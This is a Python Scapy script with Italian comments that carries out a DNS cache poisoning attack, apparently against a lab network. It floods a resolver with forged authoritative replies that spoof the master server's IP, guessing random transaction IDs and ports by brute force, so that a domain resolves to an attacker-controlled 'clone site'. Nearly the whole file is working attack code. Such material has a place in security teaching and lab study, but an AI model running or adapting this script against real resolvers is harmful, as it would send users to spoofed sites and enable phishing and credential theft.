from scapy.all import *
import random

# --- CONFIGURAZIONE TARGET ---
dns_resolver_ip = "172.20.0.53"  # IP del Resolver sulla rete Frontend
master_ip_to_spoof = "10.0.1.53" # L'IP che il Resolver si aspetta (Master)
target_domain = "www.progetto.ns."
malicious_ip = "172.20.0.80"     # IP del sito clone Nginx
# -----------------------------

print(f"[*] Avvio attacco combinato: TXID + Port Randomization")
print(f"[*] Target: {dns_resolver_ip} | Spoofing: {master_ip_to_spoof}")

def brute_force_poison():
    # Aumentiamo il numero di tentativi per coprire più combinazioni
    for i in range(1, 20001): 
        # Generiamo TXID e Porta Destinazione casuali per ogni pacchetto
        # Le porte effimere di BIND solitamente sono nel range alto
        rand_txid = random.randint(1, 65535)
        rand_port = random.randint(32768, 65535) 

        packet = (
            IP(dst=dns_resolver_ip, src=master_ip_to_spoof) /
            UDP(sport=53, dport=rand_port) / # Ora la dport è variabile!
            DNS(id=rand_txid, qr=1, aa=1, 
                qd=DNSQR(qname=target_domain), 
                an=DNSRR(rrname=target_domain, type='A', rdata=malicious_ip, ttl=3600))
        )
        
        sendp(packet,iface="eth0", verbose=0)
        
        if i % 500 == 0:
            print(f"[+] Inviate {i} combinazioni (TXID/Port)...")

if __name__ == "__main__":
    brute_force_poison()
    print("[!] Bombardamento completato.")